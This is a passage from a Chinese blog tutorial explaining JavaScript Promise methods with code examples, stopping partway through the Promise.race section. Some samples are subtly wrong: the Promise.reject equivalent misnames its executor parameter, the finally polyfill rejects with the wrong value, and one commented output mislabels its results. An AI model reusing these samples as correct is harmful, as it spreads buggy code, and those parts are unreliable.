<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Promise的九大方法(resolve、reject、then、catch、finally、all、allSettled、race、any)你都用过那些？ - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Promise的九大方法(resolve、reject、then、catch、finally、all、allSettled、race、any)你都用过那些？</h1>
			
		</header>
		<div class="content post__content clearfix">
			


        
                <div id="content_views" class="htmledit_views">
                    <blockquote> 
 <p>前言：</p> 
 <p>        定期复盘---今天我们来复习一下 Promise 的几个方法，分别是：Promise.resolve、Promise.reject、Promise.then、Promise.catch、Promise.finally、Promise.all、Promise.allSettled、Promise.race、Promise.any；</p> 
 <p>        接下来我们一起去看看吧，从深处去了解他们有什么区别！！！</p> 
</blockquote> 
<p> </p> 
<p id="main-toc"><strong>目录</strong></p> 
<p id="Promise%20%E7%8A%B6%E6%80%81-toc" style="margin-left:40px"><a href="#Promise%20%E7%8A%B6%E6%80%81">Promise 状态</a></p> 
<p id="1.%20Promise.resolve-toc" style="margin-left:40px"><a href="#1.%20Promise.resolve">1. Promise.resolve</a></p> 
<p id="2.%20Promise.reject-toc" style="margin-left:40px"><a href="#2.%20Promise.reject">2. Promise.reject</a></p> 
<p id="3.%20Promise.then-toc" style="margin-left:40px"><a href="#3.%20Promise.then">3. Promise.then</a></p> 
<p id="%C2%A0%20%E2%91%A0%20%E5%87%BD%E8%B0%83%E5%87%BD%E6%95%B0%E5%BC%82%E6%AD%A5%E6%89%A7%E8%A1%8C-toc" style="margin-left:80px"><a href="#%C2%A0%20%E2%91%A0%20%E5%87%BD%E8%B0%83%E5%87%BD%E6%95%B0%E5%BC%82%E6%AD%A5%E6%89%A7%E8%A1%8C">  ① 函调函数异步执行</a></p> 
<p id="%C2%A0%20%E2%91%A1%20%E8%BF%94%E5%9B%9E%E5%80%BC%C2%A0%20%C2%A0-toc" style="margin-left:80px"><a href="#%C2%A0%20%E2%91%A1%20%E8%BF%94%E5%9B%9E%E5%80%BC%C2%A0%20%C2%A0">  ② 返回值   </a></p> 
<p id="%C2%A0%20%E2%91%A2%20promise%E7%A9%BF%E9%80%8F-toc" style="margin-left:80px"><a href="#%C2%A0%20%E2%91%A2%20promise%E7%A9%BF%E9%80%8F">  ③ promise穿透</a></p> 
<p id="4.%20Promise.catch-toc" style="margin-left:40px"><a href="#4.%20Promise.catch">4. Promise.catch</a></p> 
<p id="%C2%A0%C2%A0%E2%91%A0%20%E8%AF%AD%E6%B3%95%E7%B3%96%E7%9A%84%E6%9C%AC%E8%B4%A8-toc" style="margin-left:80px"><a href="#%C2%A0%C2%A0%E2%91%A0%20%E8%AF%AD%E6%B3%95%E7%B3%96%E7%9A%84%E6%9C%AC%E8%B4%A8">  ① 语法糖的本质</a></p> 
<p id="%C2%A0%C2%A0%E2%91%A1%20%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA%E4%B8%BB%E4%BA%BA-toc" style="margin-left:80px"><a href="#%C2%A0%C2%A0%E2%91%A1%20%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA%E4%B8%BB%E4%BA%BA">  ② 只有一个主人</a></p> 
<p id="5.%20Promise.finally-toc" style="margin-left:40px"><a href="#5.%20Promise.finally">5. Promise.finally</a></p> 
<p id="6.%20Promise.all-toc" style="margin-left:40px"><a href="#6.%20Promise.all">6. Promise.all</a></p> 
<p id="7.%20Promise.allSettled-toc" style="margin-left:40px"><a href="#7.%20Promise.allSettled">7. Promise.allSettled</a></p> 
<p id="8.%20Promise.race-toc" style="margin-left:40px"><a href="#8.%20Promise.race">8. Promise.race</a></p> 
<p id="9.%20Promise.any-toc" style="margin-left:40px"><a href="#9.%20Promise.any">9. Promise.any</a></p> 
<hr id="hr-toc">
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p><br><strong style="color:#4f4f4f;font-size:22px;font-weight:bold">Promise 状态</strong></p> 
<p></p> 
<ul>
<li>初始状态 -&gt; pending 
  <ul>
<li>初始状态可以改变</li>
<li>在resolve 或者 reject 调用之前都处于这个状态</li>
</ul>
</li>
<li>最终成功状态 -&gt; fulfilled 
  <ul>
<li>执行 resolve 函数，状态改变为 fulfilled</li>
<li>执行 onFulfilled 函数</li>
</ul>
</li>
<li>最终失败状态 -&gt; rejected 
  <ul>
<li>执行 reject 函数，状态改变为 rejected</li>
<li>执行 onRejected 函数</li>
</ul>
</li>
<li>then 方法 
  <ul><li>then 方法为 Promise 对象注册了 onFulfilled 和 onRejected 函数</li></ul>
</li>
<li>catch 方法 
  <ul><li>catch 方法为Promise 对象注册了 onRejected 函数</li></ul>
</li>
</ul>
<hr>
<p></p> 
<h2 id="1.%20Promise.resolve">1. Promise.resolve</h2> 
<p>    静态方法<span style="color:#ed7976"><span style="background-color:#fef2f0"> </span><code><span style="background-color:#fef2f0">Promise.resolve(value)</span></code></span>可以认为是<span style="color:#ed7976"><span style="background-color:#fef2f0"> </span><code><span style="background-color:#fef2f0">new Promise</span></code></span>方法的语法糖,比如<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.resolve(42)</span></code><span style="background-color:#fef2f0"> </span></span>可以认为是以下代码的语法糖。</p> 
<pre><code class="language-javascript">
new Promise(function (resolve) {
    resolve(42)
})
</code></pre> 
<p>     这个静态方法会让<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>对象立即进入确定(即resolved) 状态，并将42传递给后面 then 里所指定的 <span style="color:#ed7976"><code><span style="background-color:#fef2f0">onFulfilled</span></code></span>函数。作为<span style="color:#ed7976"><span style="background-color:#fef2f0"> </span><code><span style="background-color:#fef2f0">new Promise</span></code></span>的快捷方式，在进行 <span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code><span style="background-color:#fef2f0"> </span></span>对象的初始化或者编写测试代码的时候都非常方便。</p> 
<p>      简单总结一下 <span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.resolve</span></code></span>方法的话，它的作用就是将传递给它的参数填充 <span style="color:#ed7976"><code><span style="background-color:#fef2f0">Fulfilled</span></code><span style="background-color:#fef2f0"> </span></span>到 <span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code><span style="background-color:#fef2f0"> </span></span>对象后并返回这个<span style="color:#ed7976"><span style="background-color:#fef2f0"> </span><code><span style="background-color:#fef2f0">Promise</span></code><span style="background-color:#fef2f0"> </span></span>对象。</p> 
<p></p> 
<h2 id="2.%20Promise.reject">2. Promise.reject</h2> 
<p><code>  <span style="color:#ed7976"><span style="background-color:#fef2f0">Promise.reject(error)</span></span></code>是和<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.resolve(value)</span></code></span>类似的静态方法，是<span style="color:#ed7976"><span style="background-color:#fef2f0"> </span><code><span style="background-color:#fef2f0">new Promise</span></code><span style="background-color:#fef2f0"> </span></span>方法的快捷方式。比如<span style="color:#ed7976"><span style="background-color:#fef2f0"> </span><code><span style="background-color:#fef2f0">Promise.reject(new Error("Promise reject error"))</span></code><span style="background-color:#fef2f0"> </span></span>就是下面代码的语法糖形式</p> 
<pre><code class="language-javascript">
new Promise(function (reject) {
    reject(new Error("Promise reject error"))
})
</code></pre> 
<p>      简单总结一下 <span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.reject</span></code></span>方法的话：它的功能是调用该<span style="color:#ed7976"><span style="background-color:#fef2f0"> </span><code><span style="background-color:#fef2f0">Promise</span></code></span>对象通过then指定的<span style="color:#ed7976"><span style="background-color:#fef2f0"> </span><code><span style="background-color:#fef2f0">onRejected</span></code></span>函数，并讲错误（Error）对象传递给这个<span style="color:#ed7976"><code><span style="background-color:#fef2f0">onRejected</span></code></span>函数</p> 
<p></p> 
<p></p> 
<h2 id="3.%20Promise.then">3. Promise.then</h2> 
<p>    <span style="color:#ed7976"><span style="background-color:#fef2f0">Promise.then(onFulfilled, onRejected)</span></span></p> 
<h3 id="%C2%A0%20%E2%91%A0%20%E5%87%BD%E8%B0%83%E5%87%BD%E6%95%B0%E5%BC%82%E6%AD%A5%E6%89%A7%E8%A1%8C">  ① 函调函数异步执行</h3> 
<pre><code class="language-javascript">
var promise = new Promise((resolve, reject) =&gt; {
  console.log("inner Promise"); // 1
  setTimeout(() =&gt; {
    resolve("Fashion Barry"); // 3
  }, 1000);
});

promise.then((res) =&gt; {
  console.log("res", res);
});
console.log("outer promise"); // 2
// Promise 实际是一个同步函数，then 方法才是异步
// 所以输出顺序如上
</code></pre> 
<p><code>  <span style="color:#ed7976"><span style="background-color:#fef2f0">Promise/A+规范</span></span></code>统一规定：Promise 只能使用异步调用方式</p> 
<p></p> 
<h3 id="%C2%A0%20%E2%91%A1%20%E8%BF%94%E5%9B%9E%E5%80%BC%C2%A0%20%C2%A0">  ② 返回值   </h3> 
<p>    不管你在回调函数 <span style="color:#ed7976"><code><span style="background-color:#fef2f0">onFulfilled</span></code></span>中会返回一个什么样的值，或者不返回值，该值都会由<span style="color:#ed7976"><span style="background-color:#fef2f0"> </span><code><span style="background-color:#fef2f0">Promis.resolve(return 的返回值)</span></code><span style="background-color:#fef2f0"> </span></span>进行响应的包装处理。因此，最终<span style="color:#ed7976"><span style="background-color:#fef2f0"> </span><code><span style="background-color:#fef2f0">then</span></code></span>的结果都是返回一个新创建的<span style="color:#ed7976"><span style="background-color:#fef2f0"> </span><code><span style="background-color:#fef2f0">Promise</span></code></span>对象。</p> 
<p>    也就是说，<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promis.then</span></code></span>不仅仅是注册一个回调函数那么简单，它还会将回调函数的返回值进行变换，创建并返回一个<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code><span style="background-color:#fef2f0"> </span></span>对象。正是<span style="color:#ed7976"><span style="background-color:#fef2f0"> </span><code><span style="background-color:#fef2f0">then</span></code></span>函数中有了这样返回值的机制，才能使得在整个<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>链式结构当中，每个<span style="color:#ed7976"><code><span style="background-color:#fef2f0">then</span></code></span>方法都能给 下一个<span style="color:#ed7976"><code><span style="background-color:#fef2f0">then</span></code></span>方法传递参数。现在我们知道怎么返回的<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>是之前的还是新的？另外该<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>的状态又是如何？</p> 
<pre><code class="language-javascript">
var aPromise = new Promise((resolve, reject) =&gt; {
  resolve("aPromise");
});
var thenPromise = aPromise.then((res) =&gt; {
  console.log("thenPromise: ", res);
});
var catchPromise = aPromise.catch((err) =&gt; {
  console.error("catchPromise: ", err);
});

console.log(aPromise !== thenPromise); // true
console.log(thenPromise !== catchPromise); // true
console.log(aPromise, thenPromise, catchPromise); // Promise { "aPromise" }, Promise { &lt;pending&gt; }, Promise { &lt;pending&gt; }
</code></pre> 
<p>    从上面结果来看，实际上不管是调用 <span style="color:#ed7976"><code><span style="background-color:#fef2f0">then</span></code></span>还是<span style="color:#ed7976"><code><span style="background-color:#fef2f0">catch</span></code></span>方法， 都返回了一个新的<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>对象</p> 
<p></p> 
<h3 id="%C2%A0%20%E2%91%A2%20promise%E7%A9%BF%E9%80%8F">  <span style="color:#fe2c24">③ promise穿透</span>
</h3> 
<p><span style="color:#fe2c24">   </span>我们先来举个例子：</p> 
<pre><code class="language-javascript">
Promise.resolve("Barry")
.then(Promise.resolve("Barry Promise"))
.then((result) =&gt; {
  console.log("result", result); // "Barry"
});
</code></pre> 
<p>如果你认为输出的是【 Barry Promise 】，那么你就错了，实际上他输出的是 【 Barry 】</p> 
<p>产生这么的输出是因为你给<span style="color:#ed7976"><code><span style="background-color:#fef2f0">then</span></code></span>方法传递了一个非函数(比如<span style="color:#ed7976"><code><span style="background-color:#fef2f0">promise</span></code></span>对象)的值，代码会这样理解 :<span style="color:#ed7976"><span style="background-color:#fef2f0"> </span><code><span style="background-color:#fef2f0">then(null)</span></code></span>,因此导致了前一个<span style="color:#ed7976"><code><span style="background-color:#fef2f0">promise</span></code></span>的结果产生了坠落的效果，也就是和下面代码是一样的， 代码直接穿透了<span style="color:#ed7976"><code><span style="background-color:#fef2f0">then(null)</span></code></span>进入了下一层链：</p> 
<pre><code class="language-javascript">
Promise.resolve("Barry")
.then(null)
.then((result) =&gt; {
  console.log("result", result); // "Barry"
});
</code></pre> 
<p>随意添加多个<span style="color:#ed7976"><code><span style="background-color:#fef2f0">then(null)</span></code></span>结果都是一样的</p> 
<pre><code class="language-javascript">
Promise.resolve("Barry")
.then(null)
.then({ name: "My name is Barry" })
.then(null)
.then((result) =&gt; {
  console.log("result", result); // "Barry"
});
</code></pre> 
<p></p> 
<h2 id="4.%20Promise.catch">4. Promise.catch</h2> 
<p></p> 
<h3 id="%C2%A0%C2%A0%E2%91%A0%20%E8%AF%AD%E6%B3%95%E7%B3%96%E7%9A%84%E6%9C%AC%E8%B4%A8">  ① 语法糖的本质</h3> 
<p>        这里我们再说一遍，实际上<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.catch</span></code></span>只是<span style="color:#ed7976"><code><span style="background-color:#fef2f0">promise.then(undefined, onRejected)</span></code><span style="background-color:#fef2f0"> </span></span>方法的一个别名而已。也就是说，这个方法用来注册当<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>对象状态变为 <span style="color:#ed7976"><code><span style="background-color:#fef2f0">Rejected</span></code></span>时 的回调函数。可以看下面代码，两者写法是等价的，但是很明显 <span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.catch</span></code></span>会让人第一眼看上去不会眼花缭乱:</p> 
<pre><code class="language-javascript">
// 第一种写法
Promise.resolve()
  .then((data) =&gt; console.log(data))
  .then(undefined, (err) =&gt; console.log(err));

// 第二种写法
Promise.resolve()
  .then((data) =&gt; console.log(data))
  .catch((err) =&gt; console.log(err));
</code></pre> 
<p>那么我们现在来说说为什么推荐使用第二种方法，而不是第一种:</p> 
<ul>
<li>使用<span style="color:#ed7976"><code><span style="background-color:#fef2f0">promise.then(onFulfilled, onRejected)</span></code><span style="background-color:#fef2f0"> </span></span>的话，在<span style="color:#ed7976"><code><span style="background-color:#fef2f0">onFulfilled</span></code></span>中发生异常的话，<span style="color:#ed7976"><code><span style="background-color:#fef2f0">onRejected</span></code><span style="background-color:#fef2f0"> </span></span>中是捕获不到这个异常的。而且如果链式很长，每一条链上都要这么写。</li>
<li>在<span style="color:#ed7976"><code><span style="background-color:#fef2f0">promise.then(onFulfilled).catch(onRejected)</span></code><span style="background-color:#fef2f0"> </span></span>的情况下<span style="color:#ed7976"><code><span style="background-color:#fef2f0">.then</span></code></span>中产生异常能在<span style="color:#ed7976"><code><span style="background-color:#fef2f0">.catch</span></code><span style="background-color:#fef2f0"> </span></span>中捕获。<span style="color:#ed7976"><code><span style="background-color:#fef2f0">.then</span></code></span>和<span style="color:#ed7976"><code><span style="background-color:#fef2f0">.catch</span></code></span>本质上是没有区别的， 需要分场合使用</li>
</ul>
<h3 id="%C2%A0%C2%A0%E2%91%A1%20%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA%E4%B8%BB%E4%BA%BA">  ② 只有一个主人</h3> 
<p>        我们上面已经说过了，在书写很长的<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>链式，从代码清晰度和简易程度来讲，在最后添加 <span style="color:#ed7976"><code><span style="background-color:#fef2f0">catch</span></code></span>是远远在每一层链上写<span style="color:#ed7976"><code><span style="background-color:#fef2f0">onRejected</span></code></span>回调函数是要好的，因为<span style="color:#ed7976"><code><span style="background-color:#fef2f0">catch</span></code></span>可以捕获 <span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>链中每一层节点的错误，这句话本身没有错，但从这句话延伸出一种错误的理解：<span style="color:#ed7976"><code><span style="background-color:#fef2f0">catch</span></code><span style="background-color:#fef2f0"> </span></span>同时监控着所有节点。实际上<span style="color:#ed7976"><code><span style="background-color:#fef2f0">catch</span></code></span>函数在同一个时间点只属于某一个<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>，因为它的主人是随着程序 的执行而不断变化的，我们来举个例子：</p> 
<pre><code class="language-javascript">
let p1 = new Promise((resolve, reject) =&gt; {
  // 第一层执行逻辑
  resolve("first promise"); // Promise(1)
})
  .then((res) =&gt; {
    // 第二层执行逻辑
    return "second promise"; // Promise(2)
  })
  .then((res) =&gt; {
    // 第三层执行逻辑
    return "third promise"; // Promise(3)
  })
  .catch((err) =&gt; {
    console.log("err", err);
  });
</code></pre> 
<p>在上述例子中，如果整个程序每一步都正确执行，那么会顺序产生三个<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>对象，分别是 <span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise(1)</span></code><span style="background-color:#fef2f0">,</span><code><span style="background-color:#fef2f0">Promise(2)</span></code><span style="background-color:#fef2f0">,</span><code><span style="background-color:#fef2f0">Promise(3)</span></code></span>:</p> 
<ul>
<li>可是如果在第一层具体执行逻辑出错了后，那实际上后面的两个<span style="color:#ed7976"><code><span style="background-color:#fef2f0">then</span></code><span style="background-color:#fef2f0"> </span></span>中的回调函数压根不会被异步执行，所以会直接异步触发<code>catch</code>中的回调函数执行， 所以这种情况下<span style="color:#ed7976"><code><span style="background-color:#fef2f0">catch</span></code></span>是<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise(1)</span></code></span>对象的<span style="color:#ed7976"><code><span style="background-color:#fef2f0">catch</span></code></span>。</li>
<li>如果第一层具体执行逻辑正确执行，就会异步触发第二个<span style="color:#ed7976"><code><span style="background-color:#fef2f0">then</span></code></span>中的回调函数执行，那么同理 ，在第二次具体执行逻辑抛出错误，会导致<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise(2)</span></code></span>的状态变化，所以这种情况下<span style="color:#ed7976"><code><span style="background-color:#fef2f0">catch</span></code><span style="background-color:#fef2f0"> </span></span>是<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise(2)</span></code></span>对象的<span style="color:#ed7976"><code><span style="background-color:#fef2f0">catch</span></code></span>。</li>
<li>同理<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise(3)</span></code></span>也是如此</li>
</ul>
<p>总结下来就是：整个<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>链中，<span style="color:#ed7976"><code><span style="background-color:#fef2f0">catch</span></code></span>只属于异步触发它当中回调函数 执行的那个<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>，并不属于所有 <span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span></p> 
<p></p> 
<p></p> 
<h2 id="5.%20Promise.finally">5. Promise.finally</h2> 
<p><code>   <span style="color:#ed7976"><span style="background-color:#fef2f0"> promise.finally</span></span></code>方法的回调函数不接受任何参数，这意味着<span style="color:#ed7976"><code><span style="background-color:#fef2f0">finally</span></code></span>没有办法 知道，前面的<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>状态到底是<span style="color:#ed7976"><code><span style="background-color:#fef2f0">fulfilled</span></code></span>还是<span style="color:#ed7976"><code><span style="background-color:#fef2f0">rejected</span></code><span style="background-color:#fef2f0"> </span></span>。这表明，<span style="color:#ed7976"><code><span style="background-color:#fef2f0">finally</span></code></span>方法里面的操作，应该是与<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>状态无关的，不依赖于 <span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>的执行结果。我们来看下面代码：</p> 
<pre><code class="language-javascript">
var p1 = new Promise((resolve, rejevt) =&gt; {
  setTimeout(() =&gt; {
    resolve;
  }, 1000);
});

p1.then((res) =&gt; console.log(res))
  .catch((err) =&gt; console.log(err))
  .finally(() =&gt; console.log("finally"));
</code></pre> 
<p><span style="color:#ed7976"><code><span style="background-color:#fef2f0">finally</span></code></span>本质上是<span style="color:#ed7976"><code><span style="background-color:#fef2f0">then</span></code></span>方法的特例。我们来看下面伪代码：</p> 
<pre><code class="language-javascript">
promise.finally(() =&gt; {
  // 执行逻辑
});
// 上面代码等同于下面
promise.then(
  (onFulilled) =&gt; {
    // 语句
    return onFulilled;
  },
  (onRejected) =&gt; {
    // 语句
    throw onRejected;
  }
);
</code></pre> 
<p>上面代码中，如果不使用<span style="color:#ed7976"><code><span style="background-color:#fef2f0">finally</span></code></span>方法，同样的语句需要为成功和失败的状态各写一次。 有了<span style="color:#ed7976"><code><span style="background-color:#fef2f0">finally</span></code></span>方法，则只需要写一次。那么它是如何实现的呢？</p> 
<pre><code class="language-javascript">
Promise.prototype.finally = function (callback) {
  let p = this.constructor;
  return this.then(
    (value) =&gt; p.resolve(callback()).then(() =&gt; value),
    (reason) =&gt;
      p.reject(callback()).then(() =&gt; {
        throw reason;
      })
  );
};

var p = new Promise((resoleve, reject) =&gt; {
  setTimeout(() =&gt; {
    reject("Promise err");
  }, 1000);
});
p.catch((err) =&gt; console.log("err", err)).finally(() =&gt; {
  console.log("finally");
});</code></pre> 
<p>上述代码中，不管前面的<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>是<span style="color:#ed7976"><code><span style="background-color:#fef2f0">fulfilled</span></code></span>还是<span style="color:#ed7976"><code><span style="background-color:#fef2f0">rejected</span></code><span style="background-color:#fef2f0"> </span></span>，都会执行回调函数<span style="color:#ed7976"><code><span style="background-color:#fef2f0">callback</span></code></span></p> 
<p></p> 
<p></p> 
<p></p> 
<h2 id="6.%20Promise.all">6. Promise.all</h2> 
<p><code>    <span style="color:#ed7976"><span style="background-color:#fef2f0">Promise.all</span></span></code>接受一个<span style="color:#ed7976"><code><span style="background-color:#fef2f0">promise</span></code></span>对象的数组作为参数，当这个数组里的所有 <span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code><span style="background-color:#fef2f0"> </span></span>对象 全部变为<span style="color:#ed7976"><code><span style="background-color:#fef2f0">resolve</span></code></span>或者<span style="color:#ed7976"><code><span style="background-color:#fef2f0">reject</span></code></span>状态的时候，它才会去调用<span style="color:#ed7976"><code><span style="background-color:#fef2f0">.then</span></code></span>方法。</p> 
<p><code>    </code>传递给<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.all</span></code></span>的 <span style="color:#ed7976"><code><span style="background-color:#fef2f0">promise</span></code></span>并不是一个个的顺序执行的，而是同时开始、并行执行的，我们可以看下面例子</p> 
<pre><code class="language-javascript">
var promise1 = new Promise((resoleve, reject) =&gt; {
  setTimeout(() =&gt; {
    resoleve("promise1--3000");
  }, 3000);
});
var promise2 = new Promise((resoleve, reject) =&gt; {
  setTimeout(() =&gt; {
    resoleve("promise2--1000");
  }, 1000);
});
var promise3 = new Promise((resoleve, reject) =&gt; {
  setTimeout(() =&gt; {
    resoleve("promise3--5000");
  }, 5000);
});

var promiseArr = [promise1, promise2, promise3];
console.time("promiseArr");
Promise.all(promiseArr)
  .then((res) =&gt; {
    console.log("res", res); // ['promise1--3000', 'promise1--1000', 'promise1--5000']
    console.timeEnd("promiseArr"); // 5523.29296875 ms
  })
  .catch((err) =&gt; console.log(err));
</code></pre> 
<p>为什么这个例子可以看出来<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.all()</span></code></span>是并行的呢？因为所有<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>执行完只用了5秒，如果3个 <span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>是按照顺序执行的，那么应该是9秒或者，在5-9之间，因为4个<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>并不是同时执行的，同时执行的 话总时间就是那个花费时间最长的<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span></p> 
<p><span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.all()</span></code></span>重要细节点 （<span style="color:#fe2c24"><strong>面试常考</strong></span>）：</p> 
<ul>
<li>如果所有的<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>中只有一个执行错误，那么整个<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.all</span></code></span>不会走<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.all().then()</span></code><span style="background-color:#fef2f0"> </span></span>而是走<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.all().catch()</span></code></span>这个流程了。但是要注意的是虽然走到了<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.all().catch()</span></code></span>这个流程 ，<span style="color:#fe2c24"><strong>但是其他 <code><span style="background-color:#fef2f0">Promise </span></code>还是会正常执行，但不会返回结果</strong></span>
</li>
<li>要注意<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.all()</span></code></span>的返回值顺序，<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.all().then()</span></code></span>的返回值顺序和传入的顺序是一致的，笔试时 遇到手写<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.all()</span></code></span>时要注意。</li>
</ul>
<p></p> 
<p></p> 
<h2 id="7.%20Promise.allSettled">7. Promise.allSettled</h2> 
<p><code>  <span style="color:#ed7976"><span style="background-color:#fef2f0">Promise.allSettled()</span></span></code>的入参和<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.all、Promise.race</span></code></span>一样，接受一个<span style="color:#ed7976"><code><span style="background-color:#fef2f0">promise</span></code><span style="background-color:#fef2f0"> </span></span>对象的数组作为参数,也是同时开始、并行执行的。但是<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.allSettled</span></code></span>的返回值需要注意以下几点：</p> 
<p><span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.allSettled</span></code></span>不会走进<span style="color:#ed7976"><span style="background-color:#fef2f0">catch</span></span>，当所有输入<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>都被履行或者拒绝时，<code> <span style="color:#ed7976"><span style="background-color:#fef2f0">statusesPromise </span></span></code>会解析一个具有具体完成状态的数组</p> 
<ul>
<li>
<code><span style="color:#ed7976"><span style="background-color:#fef2f0">{ status: 'fulfilled', value:value }</span></span> </code>：如果相应的<span style="color:#ed7976"><code><span style="background-color:#fef2f0">promise</span></code></span>被履行</li>
<li>
<span style="color:#ed7976"><code><span style="background-color:#fef2f0">{ status: 'rejected', reason: reason }</span></code></span>：如果相应的<span style="color:#ed7976"><code><span style="background-color:#fef2f0">promise</span></code></span>被拒绝</li>
</ul>
<p>我们看下面示例:</p> 
<pre><code class="language-javascript">
var promise1 = new Promise((resoleve, reject) =&gt; {
  setTimeout(() =&gt; {
    reject(new Error("promise1--3000"));
    // resoleve("promise1--3000");
  }, 3000);
});
var promise2 = new Promise((resoleve, reject) =&gt; {
  setTimeout(() =&gt; {
    // reject(new Error("promise1--1000"))
    resoleve("promise2--1000");
  }, 1000);
});
var promise3 = new Promise((resoleve, reject) =&gt; {
  setTimeout(() =&gt; {
    resoleve("promise3--5000");
    // reject(new Error("promise1--5000"))
  }, 5000);
});
var promiseArr = [promise1, promise2, promise3];
console.time("promiseArr");
Promise.allSettled(promiseArr)
  .then((res) =&gt; {
    console.log("res", res);
    console.timeEnd("promiseArr");
  })
  .catch((err) =&gt; console.error(err))
  .finally(() =&gt; console.log("finally"));
</code></pre> 
<p>总结一下：<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.allSettled()</span></code></span>在你需要执行平行和独立的异步操作并收集所有结果时非常有效， 即使某些异步操作可能失败。</p> 
<p></p> 
<p></p> 
<h2 id="8.%20Promise.race">8. Promise.race</h2> 
<p><code>  <span style="color:#ed7976"><span style="background-color:#fef2f0">Promise.rece()</span></span></code>的使用方法和<span style="color:#ed7976"><span style="background-color:#fef2f0"> </span><code><span style="background-color:#fef2f0">Promise.all</span></code></span>一样，接收一个<span style="color:#ed7976"><code><span style="background-color:#fef2f0">promise</span></code><span style="background-color:#fef2f0"> </span></span>对象的数组为参数，<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.race</span></code></span>是要有一个<span style="color:#ed7976"><span style="background-color:#fef2f0">promise</span></span>对象进入<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Fulfilled</span></code></span>或者 <span style="color:#ed7976"><code><span style="background-color:#fef2f0">Rejected</span></code></span>状态的话，就会继续进行后面的处理。这里依旧有两个点要注意：</p> 
<ul>
<li>和<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise.all</span></code></span>一样是所有数组当中的<span style="color:#ed7976"><code><span style="background-color:#fef2f0">Promise</span></code></span>同时并行的</li>
<li>
